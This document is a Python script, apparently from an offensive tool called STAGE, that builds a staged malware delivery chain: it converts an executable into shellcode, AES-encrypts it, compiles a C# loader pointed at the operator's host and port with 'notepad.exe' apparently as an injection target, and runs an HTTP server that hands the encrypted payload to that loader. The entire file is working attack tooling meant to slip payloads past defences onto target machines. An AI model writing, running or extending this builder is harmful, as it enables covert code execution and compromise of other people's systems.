import os, shutil
from utils import *
import argparse
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)


def main():
    # Set up argument parser for command-line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-p", "--payload", metavar="payload_file", type=str, required=False, default=""
    )
    parser.add_argument(
        "-T",
        "--template",
        metavar="template",
        type=str,
        required=False,
        default=os.path.abspath(
            os.path.join(os.path.dirname(__file__), "templates", "default.cs")
        ),
    )
    parser.add_argument(
        "-H",
        "--host",
        metavar="host",
        type=str,
        required=False,
        help="Specify the IP address the server will bind to (default: 0.0.0.0).",
    )
    parser.add_argument(
        "-P",
        "--port",
        metavar="port",
        type=int,
        default=8080,
        help="Specify the port the server will listen on (default: 8080).",
    )
    parser.add_argument(
        "-t",
        "--type",
        metavar="type",
        type=str,
        default="exe",
        help="The file type of payload (supported: exe, bin).",
    )
    parser.add_argument(
        "--install", action="store_true", help="Install needed tools & modules"
    )

    args = parser.parse_args()

    # Check if --install is present
    if args.install:
        setup_req()
        return

    # Get the options from arguments
    payload_file = args.payload
    payload_type = args.type
    port = args.port
    host = args.host

    if payload_file == "":
        parser.print_help()
        exit()

    if host == "":
        parser.print_help()
        exit()

    payload_file = os.path.abspath(payload_file)

    # Printing the config as a table
    print_config(host, port, payload_file)

    # Check if payload file exists
    if not os.path.exists(payload_file):
        print(Fore.RED + "[#] Payload file not found ...")
        exit()
    try:
        os.mkdir(os.path.abspath(os.path.join(os.path.dirname(__file__), "files")))
    except FileExistsError:
        pass
    
    if payload_type == "exe":
        # Convert payload (executable) to shellcode
        to_bin(payload_file)
    elif payload_type == "bin":
        pass
    else:
        print(Fore.RED + f"[#] Payload type {payload_type} is not supported.")

    # Convert shellcode to hex & write it to a file
    print(f"[i] Converting shellcode to hex... ", end="")
    write_file(
        os.path.join(os.path.dirname(__file__), "files", "payload.hex"),
        to_hex(os.path.join(os.path.dirname(__file__), "files", "payload.bin")),
    )
    print("[+] DONE !")

    # Encrypting the payload with AES
    print(f"[#] Encrypting payload with AES Encryption ...")
    ivHex, keyHex = aes_encryption_handler(
        os.path.join(os.path.dirname(__file__), "files", "payload.hex")
    )

    commKey = generate_random_key(16)  # 32 bytes key, adjust length as needed

    # Compiling the loader
    print(f"\n[#] Compiling C# Loader ... ", end="")
    loader_path = template_compile(
        os.path.abspath(args.template),
        f"http://{host}:{port}",
        commKey,
        ivHex,
        keyHex,
        "notepad.exe",
    )
    print(f"\n[i] Executable Path: {loader_path}\n")

    # Starting the server
    print(f"\n[#] Communication KEY: {commKey}")
    run_server(
        file_path=os.path.join(os.path.dirname(__file__), "files", "payload.enc"),
        host=host,
        port=port,
        key=commKey,
    )


if __name__ == "__main__":
    print(
        Fore.LIGHTBLUE_EX
        + """
███████╗████████╗ █████╗  ██████╗ ███████╗ 
██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝
███████╗   ██║   ███████║██║  ███╗█████╗  
╚════██║   ██║   ██╔══██║██║   ██║██╔══╝   |\\    /|  ____
███████║   ██║   ██║  ██║╚██████╔╝███████╗ | \\  / | |____
╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝ |  \\/  | |____
          """
    )
    main()
    input("[#] Press <Enter> To Quit ... ")
